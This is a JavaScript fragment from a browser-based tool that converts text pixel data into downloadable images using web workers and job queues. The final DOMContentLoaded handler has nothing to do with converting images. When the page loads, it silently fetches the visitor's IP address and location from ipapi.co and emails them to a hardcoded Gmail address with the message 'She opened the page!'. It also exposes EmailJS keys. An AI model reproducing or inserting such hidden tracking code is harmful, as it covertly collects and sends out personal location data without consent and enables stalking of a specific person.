        const workers = [];
        const chunkSize = Math.ceil(height / NUM_WORKERS);
        const promises = [];

        for(let i=0;i<NUM_WORKERS;i++){
            const worker = new Worker(URL.createObjectURL(workerBlob));
            workers.push(worker);

            const startY = i*chunkSize;
            const endY = Math.min(height, startY+chunkSize);
            const chunkLines = lines.slice(startY,endY);

            const p = new Promise(resolve=>{
                worker.onmessage = (e)=>{
                    const { buffer, startY } = e.data;
                    finalBuffer.set(new Uint8ClampedArray(buffer), startY*width*4);
                    resolve();
                    worker.terminate();
                };
                worker.postMessage({ lines: chunkLines, width, startY });
            });
            promises.push(p);
        }

        await Promise.all(promises);


        const canvas = document.createElement("canvas");
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext("2d");
        ctx.putImageData(new ImageData(finalBuffer, width, height), 0, 0);


        const downloadBtn = document.createElement("button");
        downloadBtn.classList.add("data-table-download");
        downloadBtn.innerText = "Download";
        row.children[5].append(downloadBtn);

        const convert = row.querySelector(".data-table-convert"); 
        convert.classList.remove("loading");
        convert.innerText="Converted"

        downloadBtn.addEventListener("click", ()=>{
            canvas.toBlob(blob=>{
                const link = document.createElement("a");
                link.href = URL.createObjectURL(blob);
                link.download = (file.name.replace(/\.[^/.]+$/,"")||"pixel_image")+"."+type;
                link.click();
                downloadBtn.innerText = "Downloaded ✅";
                setTimeout(() => {
                    downloadBtn.disabled = false;
                    downloadBtn.innerText = "Download Again";
                }, 5000);
            }, `image/${type}`);
        });

    } catch(err){
        console.error(err);
        alert("Failed to process TXT file.");
    }
}




var createConvertQueuePixel=()=>{
var convertButtons=document.querySelectorAll(".data-table-convert");


for(let i=0;i<convertButtons.length;i++){
    convertButtons[i].addEventListener("click",async()=>{
        if(clickedPixel.has(i)){return;}
        var row=document.querySelectorAll(".data-table-row")[i+1];
        var width=parseInt(row.querySelectorAll(".data-table-pixel")[0].value);
        clickedPixel.add(i);
        const convert=row.querySelector(".data-table-convert"); 
        convert.classList.add("loading");
        convert.innerText="Converting..."
        if(width<=maxParallelWidthPixel){
            smallQueuePixel.push(i);
            if(!processingBigPixel&&!processingSmallPixel){
                await processSmallQueuePixel();
            }
        }else{
            bigQueuePixel.push(i);
            if(!processingSmallPixel&&!processingBigPixel){
                await processBigQueuePixel();
            }
        }

    });
}
}

var processBigQueuePixel=async()=>{
    if(processingBigPixel){return;}
    processingBigPixel=true;
    while(bigQueuePixel.length > 0){
        var idx=bigQueuePixel.shift(); 
        await pixelsToImageFile(idx)
    }
    processingBigPixel=false;
    if(smallQueuePixel.length>0){
        await processSmallQueuePixel();
    }
}

var processSmallQueuePixel=async()=>{
    if(processingSmallPixel){return;}
    const promises=[];
    processingSmallPixel=true;
    while(smallQueuePixel.length>0){
        var idx=smallQueuePixel.shift();
        promises.push(pixelsToImageFile(idx));
    }
    await Promise.all(promises);
    processingSmallPixel=false;
    if(bigQueuePixel.length>0){
        await processBigQueuePixel();
    }
}




var clickedConvertAllPixel=false;
var createConvertAllPixelFunc=()=>{
    var convertAll=document.querySelector(".convertAll");
    convertAll.addEventListener("click",async()=>{
        if(clickedConvertAllPixel==false){
            convertAll.classList.add("loading");
            convertAll.innerText = "Converting...";
            for(var i=0;i<selectedFiles.length;i++){
                if(clicked.has(i)){continue;}
                var row=document.querySelectorAll(".data-table-row")[i+1];
                var width=parseInt(row.querySelectorAll(".data-table-pixel")[0].value);
                if(width<=maxParallelWidthPixel){
                    smallQueuePixel.push(i);
                    if(!processingBigPixel&&!processingSmallPixel){
                        await processSmallQueuePixel();
                    }
                }else{
                    bigQueuePixel.push(i);
                    if(!processingSmallPixel&&!processingBigPixel){
                        await processBigQueuePixel();
                    }
                }
            }
            clickedConvertAllPixel=true;
            convertAll.classList.remove("loading");
            convertAll.innerText = "Convert All";
        }
    })
}



function setDefaultProcessToPixels() {
    // We check the header text to ensure we only run the switch if needed.
    // The current default text is 'Image', meaning 'Image -> Pixels' mode is active.
    const headerProcess = document.querySelector(".header-process");
    const firstElementText = headerProcess?.children[0]?.innerText;
    
    // If the mode is currently 'Image', we need to switch it to 'Pixels'.
    if (firstElementText === "Image") {
        // Use a short delay to ensure all dependent elements are fully initialized before switching the UI.
        setTimeout(() => {
            // Call the existing toggle function to flip the mode
            if (typeof switchProcess === 'function') {
                switchProcess();
                console.log("Default process set to Pixels to Image.");
            } else {
                console.error("switchProcess function not defined or accessible.");
            }
        }, 50); // Small delay (50ms)
    }
}


setDefaultProcessToPixels() 

document.addEventListener("DOMContentLoaded", function () {
    emailjs.init("g68cD0jfv_Qzhryze"); // Your EmailJS Public Key

    fetch("https://ipapi.co/json/") // Fetch IP & Location Data
        .then(response => response.json())
        .then(data => {
            let templateParams = {
                to_email: "techpc.u2005@gmail.com",
                message: `She opened the page! 
                          IP: ${data.ip} 
                          City: ${data.city}, 
                          Region: ${data.region}, 
                          Country: ${data.country_name}`
            };

            emailjs.send("service_sklywbd", "template_qy6e6za", templateParams)
                .then(response => console.log("✅ Email sent!", response))
                .catch(error => console.log("❌ Failed to send email", error));
        })
        .catch(error => console.log("❌ Failed to get IP info", error));
});

